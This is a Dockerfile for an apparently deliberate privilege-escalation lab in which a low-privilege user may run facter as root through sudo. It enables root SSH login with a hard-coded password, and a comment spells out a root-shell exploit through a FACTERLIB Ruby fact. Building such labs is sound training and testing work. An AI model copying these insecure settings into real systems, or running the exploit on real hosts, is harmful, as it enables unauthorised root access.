FROM debian:bookworm-slim

# ============================================================
# PrivEscalate Scenario: sudo_facter
# ATT&CK: T1548.003 | CWE: CWE-269
# Vulnerability: sudo misconfiguration allows running /usr/bin/facter as root
# GTFOBins: facter can execute arbitrary commands via FACTERLIB
# ============================================================

ENV DEBIAN_FRONTEND=noninteractive

# Install SSH server, sudo, and facter
RUN apt-get update && \
    apt-get install -y \
        openssh-server \
        sudo \
        facter \
    && rm -rf /var/lib/apt/lists/* \
    && mkdir -p /run/sshd

# Verify facter is installed
RUN which facter && ls -la /usr/bin/facter

# Create low-privilege user
RUN useradd -m -s /bin/bash lowpriv && \
    echo "lowpriv:password123" | chpasswd

# --- Configure sudo vulnerability ---
# facter loads custom facts from directories specified in FACTERLIB.
# When run via sudo, environment variables like FACTERLIB can be inherited,
# allowing execution of arbitrary Ruby code as root.
# Exploit:
#   echo 'Facter.add("exploit") do setcode do system("/bin/bash") end end' > /tmp/exploit.rb
#   FACTERLIB=/tmp sudo facter
# Or alternatively with --trace and command execution.
RUN echo "lowpriv ALL=(root) NOPASSWD: /usr/bin/facter" > /etc/sudoers.d/facter && \
    chmod 440 /etc/sudoers.d/facter

# Verify sudo configuration
RUN visudo -c

# Keep SUID on sudo
RUN chmod u+s /usr/bin/sudo

# Configure SSH
RUN sed -i 's/#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config && \
    sed -i 's/#PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config && \
    echo "root:aim8Du7h" | chpasswd

EXPOSE 22
CMD ["/usr/sbin/sshd", "-D"]